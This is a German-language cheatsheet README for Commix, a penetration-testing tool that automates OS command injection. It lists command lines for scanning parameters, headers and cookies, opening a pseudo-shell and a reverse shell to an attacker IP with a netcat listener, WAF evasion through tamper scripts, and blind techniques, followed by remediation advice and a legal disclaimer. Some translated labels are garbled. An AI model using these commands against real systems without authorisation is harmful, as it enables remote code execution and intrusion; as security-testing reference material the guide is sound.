<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Automatisiertes Tool zum Erkennen und Ausnutzen von Command-Injection-Schwachstellen in Webanwendungen und zum Erzeugen interaktiver Shells</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht und das Command-Injection-Primitiv](#-overview--the-command-injection-primitive)
- [Installation](#-Installation)
- [Grundlegendes Schwachstellenscannen](#-basic-vulnerability-scanning)
- [Injizieren verschiedener HTTP-Elemente](#-injecting-different-http-elements)
  - [GET-Parameter](#get-parameters)
  - [POST-Daten (`--data`)](#post-data---data)
  - [HTTP-Header und Cookies](#http-headers--cookies)
- [Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [WAF-Umgehungs- und Manipulationsskripte (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Dateibasierte und zeitbasierte Blindtechniken](#-file-based--time-based-blind-techniques)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Abhilfemaßnahmen](#-defensive-überlegungen--remediation)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und das Command-Injection-Primitiv

Während **SQLMap** die SQL-Injection automatisiert, ist **Commix** (erstellt von **Anastasios Stasinopoulos**) der Goldstandard zum Auffinden und Ausnutzen von **OS Command Injection**-Schwachstellen.

Wenn Webanwendungen Benutzereingaben unsicher direkt an die Ausführungsfunktionen des Betriebssystems (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`) weiterleiten, können Angreifer beliebige Shell-Befehle anhängen. Commix erkennt automatisch ergebnisbasierte, ausgabebasierte, zeitbasierte blinde und dateibasierte Injektionsvektoren.

---

## 📥 Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Grundlegendes Schwachstellenscannen
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍Injizieren verschiedener HTTP-Elemente

### GET-Parameter
Verwenden Sie das Tag `INJECT_HERE`, wenn mehrere Parameter vorhanden sind:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### POST-Daten (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### HTTP-Header und Cookies
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Interaktive und umgekehrte Shells erzeugen

### Pseudo-Shell (`--os-shell`)

Wenn die Injektion bestätigt wird, stellt Commix ein emuliertes Pseudo-Terminal direkt in der Konsole bereit:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Native Reverse Shell (`--reverse-ip`)

Weisen Sie Commix an, eine vollständig interaktive Reverse-TCP-Verbindung zurück zu Ihrem Netcat-Listener zu trennen:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 WAF-Umgehungs- und Manipulationsskripte (`--tamper`)

Umgehen Sie Web Application Firewalls (WAF) und String-Blacklists mithilfe der integrierten Verschleierungsmanipulation:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Dateibasierte und zeitbasierte Blindtechniken

Wenn die Ausgabe nicht zurück in die HTTP-Antwort gerendert wird:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **GET-Parameter scannen** | `commix -u "<URL>?param=val"` |
| **POST-Parameter scannen** | `commix -u "<URL>" --data="param=val"` |
| **Batch-nicht-interaktiver Scan** | `commix -u "<URL>" --batch` |
| **Interaktive Terminal-Shell**| `commix -u "<URL>" --os-shell` |
| **Reverse Shell fallen lassen** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Rülpsanforderung erneut abspielen** | `commix -r burp_request.req` |
| **Space Tamper verwenden** | `commix -u "<URL>" --tamper=space2ifs` |
| **Einzelnen Befehl ausführen** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Defensive Überlegungen und Abhilfemaßnahmen

1. **Vermeiden Sie die Ausführung der Betriebssystem-Shell:** Verketten Sie niemals unbereinigte Benutzereingaben mit `system()`, `exec()` oder Shell-Befehlen.
2. **Native Language APIs verwenden:** Ersetzen Sie Systemdienstprogramme durch native Programmiersprachenbibliotheken (verwenden Sie z. B. die `socket`-Bibliothek von Python, anstatt die System-`ping`-Binärdatei auszuführen).
3. **Strenges Whitelisting:** Wenn Benutzereingaben die Programmausführung vorschreiben müssen, validieren Sie die Eingaben vor dem Aufruf anhand einer strengen alphanumerischen Whitelist.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Commix automatisiert die Ausführung beliebiger Befehle auf Zielservern. Das Fuzzen oder Ausnutzen nicht autorisierter Webanwendungen ist illegal. Verwenden Sie es nur auf Systemen, für die Sie eine ausdrückliche schriftliche Genehmigung besitzen.